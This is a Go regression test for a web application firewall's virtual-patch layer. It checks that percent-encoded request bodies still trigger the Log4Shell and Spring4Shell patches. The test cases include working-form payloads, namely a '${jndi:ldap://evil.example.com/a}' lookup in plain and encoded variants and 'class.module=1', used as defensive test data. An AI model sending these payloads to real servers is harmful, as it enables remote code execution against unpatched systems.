package virtualpatch

// Regression: the "body" scope must inspect every REPRESENTATION of the
// request body, not just the raw one.
//
// The path, query and uri scopes in getValueByType all return both the raw
// and the decoded form, because the attacker — not the operator — chooses the
// percent-encoding of the payload. The body scope returned only
// ctx.BodyString, so the shipped body-scoped patches VP-LOG4SHELL-001
// ("${jndi:") and VP-SPRING4SHELL-001 ("class.module") never fired on the
// encoded form of the identical attack, even though the backend decodes
// percent-escapes before the vulnerable code runs.
//
// These tests drive the real pipeline order — engine.AcquireContext (order:
// context), sanitizer.Layer.Process (order 300, populates ctx.NormalizedBody),
// virtualpatch.Layer.Process (order 450, the matcher) — because calling the
// matcher helper directly would bypass the very wiring under test.

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/guardianwaf/guardianwaf/internal/engine"
	"github.com/guardianwaf/guardianwaf/internal/layers/sanitizer"
)

// newBodyScopeLayer builds the layer in the shipped posture for the shipped
// default patches: enabled, CRITICAL+HIGH blocking, no NVD auto-update goroutine.
func newBodyScopeLayer() *Layer {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.AutoUpdate = false
	cfg.BlockSeverity = []string{"CRITICAL", "HIGH"}
	return NewLayer(cfg)
}

// runBodyScopePipeline drives one POST body through the real sanitizer and
// virtualpatch layers in production order.
func runBodyScopePipeline(t *testing.T, body string, skipNormalization bool) engine.LayerResult {
	t.Helper()

	req := httptest.NewRequest(http.MethodPost, "/api/search", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "regression")
	req.RemoteAddr = "203.0.113.10:5555"

	ctx := engine.AcquireContext(req, 1, 1<<20)
	defer engine.ReleaseContext(ctx)

	sanLayer := sanitizer.NewLayer(&sanitizer.Config{
		MaxURLLength:      8192,
		MaxHeaderSize:     64 * 1024,
		MaxHeaderCount:    150,
		MaxBodySize:       1 << 20,
		MaxCookieSize:     4096,
		BlockNullBytes:    true,
		SkipNormalization: skipNormalization,
	})
	_ = sanLayer.Process(ctx)

	return newBodyScopeLayer().Process(ctx)
}

// The defect: the same Log4Shell payload percent-encoded in the body must be
// blocked. Pre-fix this returned ActionPass with score 0 and no findings.
func TestBodyScope_EncodedPayloadIsBlocked(t *testing.T) {
	cases := []struct {
		name string
		body string
	}{
		// VP-LOG4SHELL-001 pattern is "${jndi:".
		{"log4shell_percent_encoded", "%24%7Bjndi%3Aldap%3A%2F%2Fevil.example.com%2Fa"},
		// Partially encoded: only the brace and colon escaped.
		{"log4shell_partially_encoded", "%24%7Bjndi:ldap://evil.example.com/a"},
		// VP-SPRING4SHELL-001 pattern is "class.module".
		{"spring4shell_percent_encoded_dot", "class%2Emodule=1"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := runBodyScopePipeline(t, tc.body, false)
			if res.Action != engine.ActionBlock {
				t.Errorf("encoded body payload not blocked: action=%v score=%d findings=%d",
					res.Action, res.Score, len(res.Findings))
			}
		})
	}
}

// Control: the unencoded payload must keep blocking. This fails if the fix
// replaced the raw form instead of adding to it.
func TestBodyScope_LiteralPayloadStillBlocked(t *testing.T) {
	cases := []string{
		"${jndi:ldap://evil.example.com/a}",
		"class.module=1",
	}
	for _, body := range cases {
		res := runBodyScopePipeline(t, body, false)
		if res.Action != engine.ActionBlock {
			t.Errorf("literal payload %q not blocked: action=%v", body, res.Action)
		}
	}
}

// Control: a benign body must still pass — adding the decoded representation
// must not turn into a blanket block.
func TestBodyScope_BenignBodyStillPasses(t *testing.T) {
	for _, body := range []string{
		"username=alice&note=hello%20world",
		"a=1&b=2&c=3",
	} {
		res := runBodyScopePipeline(t, body, false)
		if res.Action != engine.ActionPass {
			t.Errorf("benign body %q blocked: action=%v score=%d", body, res.Action, res.Score)
		}
	}
}

// Boundary: with normalize_encoding disabled the sanitizer passes the raw body
// through unchanged (ctx.NormalizedBody == ctx.BodyString). The layer must
// still block the literal payload and must not report a duplicate value.
func TestBodyScope_NormalizationDisabledStillBlocksLiteral(t *testing.T) {
	res := runBodyScopePipeline(t, "${jndi:ldap://evil.example.com/a}", true)
	if res.Action != engine.ActionBlock {
		t.Errorf("literal payload not blocked with normalization disabled: action=%v", res.Action)
	}
}

// getValueByType must return both representations when they differ, and must
// not duplicate the value when they are identical.
func TestGetValueByType_BodyReturnsBothRepresentations(t *testing.T) {
	layer := newBodyScopeLayer()
	pattern := PatchPattern{Type: "body", Pattern: "x", MatchType: "contains"}

	t.Run("differing_forms_return_both", func(t *testing.T) {
		ctx := &engine.RequestContext{BodyString: "a%20b", NormalizedBody: "a b"}
		vals := layer.getValueByType(ctx, pattern.Type, pattern.Key)
		if len(vals) != 2 {
			t.Fatalf("expected 2 representations, got %d: %v", len(vals), vals)
		}
		if !slicesContains(vals, "a%20b") || !slicesContains(vals, "a b") {
			t.Errorf("missing a representation: %v", vals)
		}
	})

	t.Run("identical_forms_not_duplicated", func(t *testing.T) {
		ctx := &engine.RequestContext{BodyString: "same", NormalizedBody: "same"}
		vals := layer.getValueByType(ctx, pattern.Type, pattern.Key)
		if len(vals) != 1 {
			t.Errorf("expected 1 value when forms are identical, got %d: %v", len(vals), vals)
		}
	})

	t.Run("empty_body_returns_nothing", func(t *testing.T) {
		ctx := &engine.RequestContext{}
		if vals := layer.getValueByType(ctx, pattern.Type, pattern.Key); len(vals) != 0 {
			t.Errorf("expected no values for empty body, got %v", vals)
		}
	})
}

func slicesContains(s []string, v string) bool {
	for _, x := range s {
		if x == v {
			return true
		}
	}
	return false
}
